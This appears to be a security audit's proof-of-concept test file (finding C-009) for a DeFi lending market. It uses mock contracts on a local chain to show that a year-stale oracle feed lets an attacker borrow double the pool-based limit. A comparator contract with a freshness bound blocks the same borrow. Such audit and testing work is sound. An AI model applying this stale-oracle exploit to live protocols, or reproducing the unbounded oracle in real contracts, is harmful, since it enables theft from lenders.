import assert from "node:assert/strict";
import { before, test } from "node:test";
import { compileAll, deploy, ether, expectRevert, makeChain, send } from "../../../test/support.mjs";

const comparatorSource = `
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IFeedC009 {
    function decimals() external view returns (uint8);
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
}
interface IPoolC009 { function spotPrice() external view returns (uint256); }
contract FreshnessOracleC009 {
    IFeedC009 public immutable feed;
    IPoolC009 public immutable pool;
    uint256 public constant MAX_AGE = 1 days;
    constructor(IFeedC009 feed_, IPoolC009 pool_) { feed = feed_; pool = pool_; }
    function price() external view returns (uint256) {
        (, int256 answer,, uint256 updatedAt,) = feed.latestRoundData();
        if (answer > 0 && updatedAt != 0 && block.timestamp - updatedAt <= MAX_AGE) {
            uint256 value = uint256(answer);
            uint8 d = feed.decimals();
            if (d < 18) return value * 10 ** (18 - d);
            if (d > 18) return value / 10 ** (d - 18);
            return value;
        }
        return pool.spotPrice();
    }
}
`;

let artifacts;

before(async () => {
  artifacts = await compileAll({
    additionalSources: { "run/evidence/C-009/FreshnessOracleC009.sol": comparatorSource }
  });
});

async function setup(oracleContract = "ReserveOracle") {
  const chain = await makeChain();
  const [admin, liquidityProvider, attacker] = chain.signers;
  const asset = await deploy(artifacts, "MockERC20", admin, ["Aster Asset", "AST", 18]);
  const stable = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
  const vault = await deploy(artifacts, "AsterVault", admin, [await asset.getAddress()]);
  const pool = await deploy(artifacts, "ReservePool", admin, [await asset.getAddress(), await stable.getAddress()]);
  const feed = await deploy(artifacts, "MockFeed", admin, [8, 200_000_000]);
  const oracle = await deploy(artifacts, oracleContract, admin, [await feed.getAddress(), await pool.getAddress()]);
  const market = await deploy(artifacts, "LendingMarket", admin, [
    await stable.getAddress(), await vault.getAddress(), await oracle.getAddress(), await admin.getAddress()
  ]);
  const attackerAddress = await attacker.getAddress();

  await send(asset.mint(await liquidityProvider.getAddress(), ether(10_000)));
  await send(stable.mint(await liquidityProvider.getAddress(), ether(10_000)));
  await send(asset.connect(liquidityProvider).approve(await pool.getAddress(), ether(10_000)));
  await send(stable.connect(liquidityProvider).approve(await pool.getAddress(), ether(10_000)));
  await send(pool.connect(liquidityProvider).addLiquidity(ether(10_000), ether(10_000)));
  await send(stable.mint(await market.getAddress(), ether(10_000)));
  await send(asset.mint(attackerAddress, ether(1_000)));
  await send(asset.connect(attacker).approve(await vault.getAddress(), ether(1_000)));
  await send(vault.connect(attacker).deposit(ether(1_000), attackerAddress));
  await send(vault.connect(attacker).approve(await market.getAddress(), ether(1_000)));
  await send(market.connect(attacker).depositCollateral(ether(1_000), attackerAddress));

  const [, , , updatedAt] = await feed.latestRoundData();
  await chain.provider.send("evm_increaseTime", [365 * 24 * 60 * 60]);
  await chain.provider.send("evm_mine", []);
  const now = BigInt((await chain.provider.getBlock("latest")).timestamp);
  return { attacker, attackerAddress, stable, feed, pool, oracle, market, updatedAt, now };
}

test("positive: year-old positive feed answer remains authoritative and enables excess debt", async () => {
  const context = await setup();
  const age = context.now - context.updatedAt;
  const stalePrice = await context.oracle.price();
  const poolPrice = await context.pool.spotPrice();
  const poolBasedLimit = ether(750);
  assert(age > 300n * 24n * 60n * 60n);
  assert.equal(stalePrice, ether(2));
  assert.equal(poolPrice, ether(1));

  await send(context.market.connect(context.attacker).borrow(
    ether(1_500), context.attackerAddress, "0x"
  ));
  assert.equal(await context.market.debt(context.attackerAddress), ether(1_500));
  assert((await context.market.debt(context.attackerAddress)) > poolBasedLimit);
  console.log(JSON.stringify({ oracle: "C-009-positive", feedAgeSeconds: String(age), staleFeedPrice: String(stalePrice), poolPrice: String(poolPrice), poolBasedLimit: String(poolBasedLimit), debtAfter: String(await context.market.debt(context.attackerAddress)) }));
});

test("negative comparator: an explicit freshness bound falls back to pool price and rejects the same debt", async () => {
  const context = await setup("FreshnessOracleC009");
  const boundedPrice = await context.oracle.price();
  assert.equal(boundedPrice, ether(1));
  await expectRevert(context.market.connect(context.attacker).borrow(
    ether(1_500), context.attackerAddress, "0x"
  ));
  assert.equal(await context.market.debt(context.attackerAddress), 0n);
  console.log(JSON.stringify({ oracle: "C-009-negative", boundedPrice: String(boundedPrice), excessBorrowRejected: true, debtAfter: "0" }));
});

